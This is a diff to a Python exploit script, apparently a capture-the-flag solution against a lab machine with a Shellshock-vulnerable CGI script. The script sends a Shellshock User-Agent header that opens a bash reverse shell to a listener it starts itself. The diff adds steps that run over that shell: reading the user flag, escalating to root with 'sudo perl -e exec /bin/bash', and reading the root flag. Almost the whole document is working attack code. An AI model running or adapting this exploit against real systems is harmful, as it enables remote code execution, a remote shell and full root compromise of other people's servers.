@@ -1,14 +1,15 @@
 import requests
-import warnings
 from urllib.parse import quote
 import argparse
 import socket
 import telnetlib
 from threading import Thread
-warnings.filterwarnings("ignore")
-requests.packages.urllib3.disable_warnings(
-    requests.packages.urllib3.exceptions.InsecureRequestWarning
-)
+import re
+import urllib3  
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+session = requests.Session()
+session.verify = False
 
 class Interface:
     def __init__(self):
@@ -31,34 +32,36 @@ class Interface:
     def success(self, message):
         print(f"({self.green}✓{self.end}) {self.bold}{message}{self.end}")
 
-def exploitFailed(msg):
-    exit(output.error(f"FAILED!!"))
+def send_get(url, headers={}, cookies={}):
+    request = session.get(url, headers=headers, cookies=cookies, allow_redirects=False)
+    return request
 
-def encodeUrl(string):
-    return quote(string, safe="")
-
-def sendGet(url, headers={}, cookies={}):
-    r = session.get(url, headers=headers, cookies=cookies, allow_redirects=False)
-    return r
-
-def exec_code(rport):
-    handlerthr = Thread(target=handler, args=(rport,))
+def exec_code(lport):
+    handlerthr = Thread(target=handler, args=(lport,))
     handlerthr.start()
 
-def handler(rport):
-    output.success("Starting handler on port %d" % int(rport))
+def handler(lport):
+    flag_data = ""
+    flag_data2 = ""
+    flag_pattern = "[0-9a-f]{32}"
     t = telnetlib.Telnet()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("0.0.0.0", int(rport)))
+    s.bind(("0.0.0.0", int(lport)))
     s.listen(1)
     conn, addr = s.accept()
-    output.success("Connection from %s" % addr[0])
     t.sock = conn
-    t.interact()
-    return
+    t.sock.send(b"cat /home/shelly/user.txt\n")
+    for i in range(3):
+        flag_data = flag_data + t.sock.recv(2048).decode()
+    output.success("User flag: " + flag_data.split("\n")[2])
 
-session = requests.Session()
-session.verify = False
+    t.sock.send(b'''sudo perl -e 'exec "/bin/bash";'\n''')
+    t.sock.send(b"cat /root/root.txt\n")
+    for i in range(3):
+        flag_data2 = flag_data2 + t.sock.recv(2048).decode()
+    output.success("Root flag: " + flag_data2.split("\n")[1])
+    
+    
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -81,8 +84,8 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     target_url = args.url
-    lhost = args.lhost
-    lport = args.lport
+    listen_host = args.lhost
+    listen_port = args.lport
     if args.debug:
         session.proxies = {
             "http": "http://127.0.0.1:8080",
@@ -91,6 +94,6 @@ if __name__ == "__main__":
 
     global output
     output = Interface()
-    exec_code(lport)
-    sendGet(target_url + "/cgi-bin/user.sh",{"User-Agent": "() { :;}; /bin/bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1;"})
+    exec_code(listen_port)
+    send_get(target_url + "/cgi-bin/user.sh",{"User-Agent": "() { :;}; /bin/bash -i >& /dev/tcp/" + listen_host + "/" + listen_port + " 0>&1;"})
     
